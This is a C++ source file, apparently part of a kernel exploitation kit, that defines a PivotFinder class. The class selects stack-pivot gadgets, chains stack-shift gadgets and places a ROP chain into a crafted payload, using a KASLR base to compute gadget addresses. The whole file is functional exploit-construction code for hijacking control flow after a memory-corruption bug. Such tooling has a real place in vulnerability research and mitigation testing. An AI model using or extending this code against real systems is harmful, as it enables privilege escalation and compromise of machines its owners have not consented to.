#pragma once

#include <limits>
#include <optional>
#include "pivot/Pivots.cpp"
#include "pivot/StackPivot.cpp"
#include "payloads/Payload.cpp"
#include "payloads/RopChain.cpp"
#include "util/stdutils.cpp"

struct StackShiftInfo {
    uint64_t from_offset;
    const StackShiftPivot& pivot;
};

struct StackShiftingInfo {
    std::vector<StackShiftInfo> stack_shifts;
    uint64_t to_offset;

    void Apply(uint64_t kaslr_base, Payload& payload) {
        for (auto& shift : stack_shifts)
            payload.Set(shift.from_offset, kaslr_base + shift.pivot.address);
    }
};

struct RopPivotInfo {
    const RopChain& rop;
    StackPivot pivot;
    uint64_t rop_min_offset;
    uint64_t rop_offset;
    StackShiftingInfo stack_shift;

    // TODO: make this more universal
    void PrintDebugInfo() const {
        printf("[+] Selected stack pivot: %s\n", pivot.GetDescription().c_str());

        for (auto& shift : stack_shift.stack_shifts)
            printf("[+] Stack jump @0x%lx: 0x%lx -> 0x%lx (size: 0x%lx)\n", shift.pivot.address,
                shift.from_offset, shift.from_offset + shift.pivot.shift_amount, shift.pivot.shift_amount);

        printf("[+] ROP chain offset: 0x%lx\n", rop_offset);
    }
};

class PivotFinder {
    Pivots pivots_;
    std::set<Register> buf_regs_;
    Payload& payload_;

    std::vector<StackPivot> FindInternal(bool only_one, uint64_t free_bytes_after = 0) {
        std::vector<StackPivot> result;

        for (auto& gadget : pivots_.one_gadgets) {
            if (!CheckOneGadget(gadget, free_bytes_after))
                continue;

            result.push_back(StackPivot(gadget));
            if (only_one)
                return result;
        }

        for (auto& push : pivots_.push_indirects) {
            if (!CheckPushIndirect(push, free_bytes_after))
                continue;

            payload_.Reserve(push.next_rip_offset, 8);

            for (auto& pop : pivots_.pop_rsps) {
                auto push_change = push.indirect_type == IndirectType::CALL ? 8 : 0;
                if (pop.stack_change_before_rsp != push_change ||
                    !payload_.CheckFree(pop.next_rip_offset, 8 + free_bytes_after))
                        continue;

                    result.push_back(StackPivot(push, pop));
                    if (only_one)
                        break;
            }

            payload_.Release(push.next_rip_offset, 8);

            if (only_one && !result.empty())
                break;
        }

        return result;
    }

    void SortFields(){
        sortByField<OneGadgetPivot>(pivots_.one_gadgets, [](auto& a) { return a.next_rip_offset; });
        sortByField<PushIndirectPivot>(pivots_.push_indirects, [](auto& a) { return a.next_rip_offset; });
        sortByField<PopRspPivot>(pivots_.pop_rsps, [](auto& a) { return a.next_rip_offset; });
        sortByField<StackShiftPivot>(pivots_.stack_shifts, [](auto& a) { return a.shift_amount; });
    }

public:
    PivotFinder(const Pivots &pivots,
                Register buf_reg,
                Payload &payload)
        : pivots_(pivots), buf_regs_({buf_reg}), payload_(payload)
    {
        SortFields();
    }

    PivotFinder(const Pivots &pivots,
                std::vector<Register> buf_regs,
                Payload &payload)
        : pivots_(pivots), buf_regs_(buf_regs.begin(), buf_regs.end()), payload_(payload)
    {
        SortFields();
    }

    bool CheckRegister(const RegisterUsage& reg) {
        // Check it's using a register pointing at this buffer
        if (buf_regs_.find(reg.reg) == buf_regs_.end())
            return false;

        // TODO: it can be used as long as it is not used for RIP control (just pre-RIP control vuln trigger)
        // TODO: it is also possible that we can jump over it
        for (auto offs : reg.used_offsets)
            if (!payload_.CheckFree(offs, 8))
                return false;

        return true;
    }

    bool CheckOneGadget(const OneGadgetPivot& pivot, uint64_t free_bytes_after = 0) {
        return CheckRegister(pivot.pivot_reg) &&
               payload_.CheckFree(pivot.next_rip_offset, 8 + free_bytes_after);
    }

    bool CheckPushIndirect(const PushIndirectPivot& pivot, uint64_t free_bytes_after = 0) {
        return CheckRegister(pivot.push_reg) &&
               CheckRegister(pivot.indirect_reg) &&
               payload_.CheckFree(pivot.next_rip_offset, 8 + free_bytes_after);
    }

    std::vector<StackPivot> FindAll() {
        return FindInternal(false);
    }

    std::optional<StackShiftPivot> FindShift(uint64_t min_shift, uint64_t upper_bound = std::numeric_limits<uint64_t>::max()) {
        // Find the minimum shift_amount >= min_shift
        for (const auto &pivot : pivots_.stack_shifts)
        {
            // Only consider shifts which have the next rip in the last position for now
            if (pivot.shift_amount >= min_shift &&
                pivot.shift_amount < upper_bound &&
                pivot.JumpsToShift())
            {
                return pivot;
            }
        }

        // No match found
        return std::nullopt;
    }

    std::optional<StackPivot> Find(uint64_t free_bytes_after = 0) {
        auto result = FindInternal(true, free_bytes_after);
        return result.empty() ? std::nullopt : std::optional(result[0]);
    }

    std::optional<StackShiftingInfo> FindShifts(uint64_t from_offset, uint64_t min_to_offset) {
        std::vector<StackShiftInfo> shifts;

        while (from_offset < min_to_offset) {
            auto shift_remaining = min_to_offset - from_offset;

            auto shift = std::lower_bound(pivots_.stack_shifts.begin(),
                pivots_.stack_shifts.end(), shift_remaining,
                [](const StackShiftPivot& shift, int x) { return shift.shift_amount < x; });

            if (shift == pivots_.stack_shifts.end())
                shift--; // use the largest possible value

            while (true) {
                auto target_offset = from_offset + shift->shift_amount;

                if (shift->JumpsToShift() &&
                    payload_.CheckFree(target_offset, 8)) {
                    shifts.push_back(StackShiftInfo { from_offset, *shift });
                    from_offset = target_offset;
                    break;
                }

                shift--;
                if (shift == pivots_.stack_shifts.begin())
                    return std::nullopt;
            }
        }

        return StackShiftingInfo { shifts, from_offset };
    }

    uint64_t ApplyShift(uint64_t kaslr_base, uint64_t from_offset, uint64_t min_to_offset) {
        auto shifts = FindShifts(from_offset, min_to_offset);
        if (!shifts.has_value())
            throw ExpKitError("could not find a right stack shift gadget");
        shifts->Apply(kaslr_base, payload_);
        return shifts->to_offset;
    }

    RopPivotInfo PivotToRop(const RopChain& rop, int padding_before_rop = 0) {
        auto snapshot = payload_.Snapshot();
        for (auto& pivot : FindInternal(false)) {
            payload_.Restore(snapshot);
            pivot.ApplyToPayload(payload_, rop.kaslr_base_);

            auto rop_min_offset = payload_.FindEmpty(padding_before_rop + rop.GetByteSize(), 8);
            if (!rop_min_offset)
                continue; // not enough space for the ROP chain

            auto rop_min_offset_w_pad = padding_before_rop + *rop_min_offset;
            auto shifts = FindShifts(pivot.GetDestinationOffset(), rop_min_offset_w_pad);
            if (!shifts || !payload_.CheckFree(shifts->to_offset, rop.GetByteSize()))
                continue; // no good shift or not enough space for ROP chain after shifts

            shifts->Apply(rop.kaslr_base_, payload_);
            payload_.Set(shifts->to_offset, rop.GetData());
            return RopPivotInfo { rop, pivot, rop_min_offset_w_pad, shifts->to_offset, *shifts };
        }

        payload_.Restore(snapshot);
        throw ExpKitError("could not pivot");
    }

    std::optional<PopRspPivot> GetPopRsp() {
        for (const auto &pivot : pivots_.pop_rsps)
            if (pivot.stack_change_before_rsp == 0 && pivot.next_rip_offset == 0)
                return std::optional(pivot);
        return std::nullopt;
    }
};
